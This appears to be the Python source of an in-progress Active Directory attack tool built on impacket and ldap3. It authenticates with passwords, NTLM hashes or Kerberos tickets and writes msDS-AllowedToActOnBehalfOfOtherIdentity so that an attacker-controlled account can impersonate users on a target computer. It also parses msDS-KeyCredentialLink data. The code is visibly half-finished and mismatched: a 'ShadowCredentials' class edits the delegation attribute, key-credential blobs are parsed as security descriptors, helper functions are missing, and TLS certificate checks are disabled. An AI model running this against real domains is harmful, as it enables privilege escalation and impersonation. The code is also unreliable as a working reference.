#!/usr/bin/env python3
#
# Description: Python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
#
# Authors:
#  Remi Gascou (@podalirius_)
#  Charlie Bromberg (@_nwodtuhs)
#

from binascii import unhexlify
from enum import Enum
from impacket.examples import logger, utils
from impacket import version
from impacket.ldap import ldaptypes
from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars
import argparse
import base64
import binascii
import datetime
import io
import json
import ldap3
import ldapdomaindump
import logging
import os
import ssl
import struct
import sys
import time
import traceback




class KeyCredentialEntryType(Enum):
    KeyID = 0x01
    KeyHash = 0x02
    KeyMaterial = 0x03
    KeyUsage = 0x04
    KeySource = 0x05
    DevideId = 0x06
    CustomKeyInformation = 0x07
    KeyApproximateLastLogonTimeStamp = 0x08
    KeyCreationTime = 0x09

class KeyCredentialVersion(Enum):
    Version0 = 0x0
    Version1 = 0x00000100
    Version2 = 0x00000200

class KeySource(Enum):
    AD = 0x0
    AzureAD = 0x1
    OTHER = 0x0

class KeyUsage(Enum):
    AdminKey = 0x0
    NGC = 0x1
    STK = 0x2
    BitLockerRecovery = 0x3
    FIDO = 0x7
    FEK = 0x8
    OTHER = 0x0

class CustomKeyInformation(object):
    def __init__(self, keyMaterial, version:KeyCredentialVersion):
        super(CustomKeyInformation, self).__init__()

        stream_data = io.BytesIO(keyMaterial)

        # An 8-bit unsigned integer that must be set to 1:
        self.Version = None
        self.Version = struct.unpack('<B',stream_data.read(1))[0]

        # An 8-bit unsigned integer that specifies zero or more bit-flag values.
        self.Flags = None
        self.Flags = struct.unpack('<B',stream_data.read(1))[0]

        # Note: This structure has two possible representations.
        # In the first representation, only the Version and Flags fields are
        # present; in this case the structure has a total size of two bytes.
        # In the second representation, all additional fields shown below are
        # also present; in this case, the structure's total size is variable.
        # Differentiating between the two representations must be inferred using
        # only the total size.

        # An 8-bit unsigned integer that specifies one of the volume types.
        data = stream_data.read(1)
        if len(data) != 0:
            self.VolumeType = struct.unpack('<B',data)[0]
        else:
            self.VolumeType = None

        # An 8-bit unsigned integer that specifies whether the device associated with this credential supports notification.
        data = stream_data.read(1)
        if len(data) != 0:
            self.SupportsNotification = bool(struct.unpack('<B',data)[0]);
        else:
            self.SupportsNotification = None

        # An 8-bit unsigned integer that specifies the version of the
        # File Encryption Key (FEK). This field must be set to 1.
        data = stream_data.read(1)
        if len(data) != 0:
            self.FekKeyVersion = struct.unpack('<B',data)[0]
        else:
            self.FekKeyVersion = None

        # An 8-bit unsigned integer that specifies the strength of the NGC key.
        data = stream_data.read(1)
        if len(data) != 0:
            self.Strength = struct.unpack('<B',data)[0]
        else:
            self.Strength = None

        # 10 bytes reserved for future use.
        # Note: With FIDO, Azure incorrectly puts here 9 bytes instead of 10.
        data = stream_data.read(10)
        if len(data) != 0:
            self.Reserved = data.rjust(10,'b\x00')
        else:
            self.Reserved = None

        # Extended custom key information.
        data = stream_data.read()
        if len(data) != 0:
            self.EncodedExtendedCKI = data
        else:
            self.EncodedExtendedCKI = None

    # def __dict__(self):
    #     return vars(self)

    def __repr__(self):
        return str(vars(self))

def ConvertToBinaryIdentifier(keyIdentifier, version:KeyCredentialVersion):
    if version in [KeyCredentialVersion.Version0.value, KeyCredentialVersion.Version1.value]:
        return binascii.unhexlify(keyIdentifier)
    if version == KeyCredentialVersion.Version2.value:
        return base64.b64decode(keyIdentifier)
    else:
        return base64.b64decode(keyIdentifier)

def Guid(data:bytes):
    a = hex(struct.unpack("<L",data[0:4])[0])[2:].rjust(4,'0')
    b = hex(struct.unpack("<H",data[4:6])[0])[2:].rjust(2,'0')
    c = hex(struct.unpack("<H",data[6:8])[0])[2:].rjust(2,'0')
    d = hex(struct.unpack(">H",data[8:10])[0])[2:].rjust(2,'0')
    e = binascii.hexlify(data[10:16]).decode("UTF-8").rjust(6,'0')
    return "%s-%s-%s-%s-%s" % (a, b, c, d, e)

def ConvertFromBinaryTime(binaryTime:bytes, source:KeySource, version:KeyCredentialVersion):
    """
    Documentation for ConvertFromBinaryTime

    Src : https://github.com/microsoft/referencesource/blob/master/mscorlib/system/datetime.cs
    """

    timeStamp = struct.unpack('<Q', binaryTime)[0]

    # AD and AAD use a different time encoding.
    if version == KeyCredentialVersion.Version0.value:
        return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
    if version == KeyCredentialVersion.Version1.value:
        return  datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
    if version == KeyCredentialVersion.Version2.value:
        if source == KeySource.AD.value:
            return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
        else:
            print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
            return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
    else:
        if source == KeySource.AD.value:
            return  datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
        else:
            print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
            return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)

class DN_binary_KeyCredentialLink():

    def __init__(self, raw_data):
        self.structure = {}
        self.version   = KeyCredentialVersion.Version0

        ## Spliting input data
        data = raw_data.decode('UTF-8').split(":")
        # type = data[0]
        # length = int(data[1])
        binary_data = binascii.unhexlify(data[2])
        self.structure["dn"] = data[3]

        ## Reading binary data as stream
        data = []
        stream_data = io.BytesIO(binary_data)
        self.version = struct.unpack('<L', stream_data.read(4))[0]

        read_data = stream_data.read(3)
        while read_data != b'':
            # A 16-bit unsigned integer that specifies the length of the Value field.
            length, entryType = struct.unpack('<HB', read_data)
            # An 8-bit unsigned integer that specifies the type of data that is stored in the Value field.
            data.append({
                "entryType" : entryType,
                "value" : stream_data.read(length)
            })
            read_data = stream_data.read(3)

        ## Parsing data
        self.parsed_data = {"version": self.version}
        for row in data:
            # print(row)
            if row["entryType"] == KeyCredentialEntryType.KeyID.value:
                self.parsed_data['KeyID'] = ConvertToBinaryIdentifier(row["value"], self.version)
            elif row["entryType"] == KeyCredentialEntryType.KeyHash.value:
                # We do not need to validate the integrity of the data by the hash
                pass
            elif row["entryType"] == KeyCredentialEntryType.KeyMaterial.value:
                self.parsed_data['KeyMaterial'] = row["value"]
            elif row["entryType"] == KeyCredentialEntryType.KeyUsage.value:
                if(len(row["value"]) == 1):
                    # This is apparently a V2 structure
                    self.parsed_data['Usage'] = row["value"][0]
                else:
                    # This is a legacy structure that contains a string-encoded key usage instead of enum.
                    self.parsed_data['LegacyUsage'] = row["value"].decode('UTF-8')
            elif row["entryType"] == KeyCredentialEntryType.KeySource.value:
                self.parsed_data['KeySource'] = row["value"][0]
                self.source = self.parsed_data['KeySource']
            elif row["entryType"] == KeyCredentialEntryType.DevideId.value:
                self.parsed_data['DevideId'] = Guid(row["value"])
            elif row["entryType"] == KeyCredentialEntryType.CustomKeyInformation.value:
                self.parsed_data['CustomKeyInfo'] = CustomKeyInformation(row["value"], self.version)
            elif row["entryType"] == KeyCredentialEntryType.KeyApproximateLastLogonTimeStamp.value:
                self.parsed_data['KeyApproximateLastLogonTimeStamp'] = ConvertFromBinaryTime(row["value"], self.source, self.version)
            elif row["entryType"] == KeyCredentialEntryType.KeyCreationTime.value:
                self.parsed_data['KeyCreationTime'] = ConvertFromBinaryTime(row["value"], self.source, self.version)


    def show(self):
        for key in self.parsed_data.keys():
            print("\x1b[91m => %s\x1b[0m:" % key,self.parsed_data[key])

    def __repr__(self):
        return "<DN_binary_KeyCredentialLink version=%s>" % hex(self.version)

    def __dict__(self):
        return self.structure

def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            # No cache present
            print(e)
            pass
        else:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                logging.debug('Domain retrieved from CCache: %s' % domain)

            logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
            principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logging.debug('Using TGT from cache')
                else:
                    logging.debug('No valid credentials found in cache')
            else:
                TGS = creds.toTGS(principal)
                logging.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                logging.debug('Username retrieved from CCache: %s' % user)
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                logging.debug('Username retrieved from CCache: %s' % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True

class ShadowCredentials(object):
    def __init__(self, ldap_server, ldap_session, delegate_to):
        super(ShadowCredentials, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.delegate_to = delegate_to
        self.SID_delegate_from = None
        self.DN_delegate_to = None
        logging.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)

    def read(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Computer to modify does not exist! (wrong domain?)')
            return
        self.DN_delegate_to = result[0]
        self.get_keycredentiallink()

        return

    def write(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('User to escalate does not exist!')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Computer to modify does not exist! (wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including previous data
        sd, targetuser = self.get_keycredentiallink()

        # writing only if SID not already in list
        if self.SID_delegate_from not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
            self.ldap_session.modify(targetuser['dn'],
                                     {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE,
                                                                                   [sd.getData()]]})
            if self.ldap_session.result['result'] == 0:
                logging.info('Delegation rights modified successfully!')
                logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            else:
                if self.ldap_session.result['result'] == 50:
                    logging.error('Could not modify object, the server reports insufficient rights: %s',
                                  self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logging.error('Could not modify object, the server reports a constrained violation: %s',
                                  self.ldap_session.result['message'])
                else:
                    logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        else:
            logging.info('%s can already impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
            logging.info('Not modifying the delegation rights.')
        # Get list of allowed to act
        self.get_keycredentiallink()
        return

    def remove(self, delegate_from):
        self.delegate_from = delegate_from

        # Get escalate user sid
        result = self.get_user_info(self.delegate_from)
        if not result:
            logging.error('User to escalate does not exist!')
            return
        self.SID_delegate_from = str(result[1])

        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Computer to modify does not exist! (wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act and build security descriptor including that data
        sd, targetuser = self.get_keycredentiallink()

        # Remove the entries where SID match the given -delegate-from
        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_delegate_from != ace['Ace']['Sid'].formatCanonical()]
        self.ldap_session.modify(targetuser['dn'],
                                 {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.ldap_session.result['result'] == 0:
            logging.info('Delegation rights modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_keycredentiallink()
        return

    def flush(self):
        # Get target computer DN
        result = self.get_user_info(self.delegate_to)
        if not result:
            logging.error('Computer to modify does not exist! (wrong domain?)')
            return
        self.DN_delegate_to = result[0]

        # Get list of allowed to act
        sd, targetuser = self.get_keycredentiallink()

        self.ldap_session.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, []]})
        if self.ldap_session.result['result'] == 0:
            logging.info('Delegation rights flushed successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        # Get list of allowed to act
        self.get_keycredentiallink()
        return

    def get_keycredentiallink(self):
        # Get target's msDS-KeyCredentialLink attribute
        self.ldap_session.search(self.DN_delegate_to, '(objectClass=*)', search_scope=ldap3.BASE,
                                 attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        targetuser = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target user properties')
            return

        try:
            attr = DN_binary_KeyCredentialLink(targetuser['raw_attributes']['msDS-KeyCredentialLink'][0])
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                data = targetuser['raw_attributes']['msDS-KeyCredentialLink'][0])
            # todo : stopped here
            if len(sd['Dacl'].aces) > 0:
                logging.info('Accounts allowed to act on behalf of other identity:')
                for ace in sd['Dacl'].aces:
                    SID = ace['Ace']['Sid'].formatCanonical()
                    SamAccountName = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())[1]
                    logging.info('    %-10s   (%s)' % (SamAccountName, SID))
            else:
                logging.info('Attribute msDS-KeyCredentialLink is empty')
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink is empty')
            # Create DACL manually
            sd = create_empty_sd()
        return sd, targetuser

    def get_user_info(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logging.error('SID not found in LDAP: %s' % sid)
            return False

def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Python (re)setter for property msDS-KeyCredentialLink for Kerberos RBCD attacks.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-delegate-to", type=str, required=True,
                        help="Target computer account the attacker has at least WriteProperty to")
    parser.add_argument("-delegate-from", type=str, required=False,
                        help="Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)")
    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read',
                        help='Action to operate on msDS-KeyCredentialLink')

    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If '
                            'omitted it will use the domain part (FQDN) specified in '
                            'the identity parameter')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def parse_identity(args):
    domain, username, password = utils.parse_credentials(args.identity)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass
        logging.info("No credentials supplied, supply password")
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, lmhash, nthash


def init_logger(args):
    # Init the example's logger theme and debug level
    logger.init(args.ts)
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.aesKey, kdcHost=args.dc_ip)
    elif args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.k:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain

    if args.use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, args, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, args, domain, username, password, lmhash, nthash)
    else:
        return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash)


def main():
    print(version.BANNER)
    args = parse_args()
    init_logger(args)

    if args.action == 'write' and args.delegate_from is None:
        logging.critical('`-delegate-from` should be specified when using `-action write` !')
        sys.exit(1)

    domain, username, password, lmhash, nthash = parse_identity(args)
    if len(nthash) > 0 and lmhash == "":
        lmhash = "aad3b435b51404eeaad3b435b51404ee"

    # if args.delegate_from and args.delegate_from[-1] != "$":
    #     args.delegate_from += "$"
    # if args.delegate_to[-1] != "$":
    #     args.delegate_to += "$"

    try:
        ldap_server, ldap_session = init_ldap_session(args, domain, username, password, lmhash, nthash)
        shadowcreds = ShadowCredentials(ldap_server, ldap_session, args.delegate_to)
        if args.action == 'read':
            shadowcreds.read()
        elif args.action == 'write':
            shadowcreds.write(args.delegate_from)
        elif args.action == 'remove':
            shadowcreds.remove(args.delegate_from)
        elif args.action == 'flush':
            shadowcreds.flush()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()
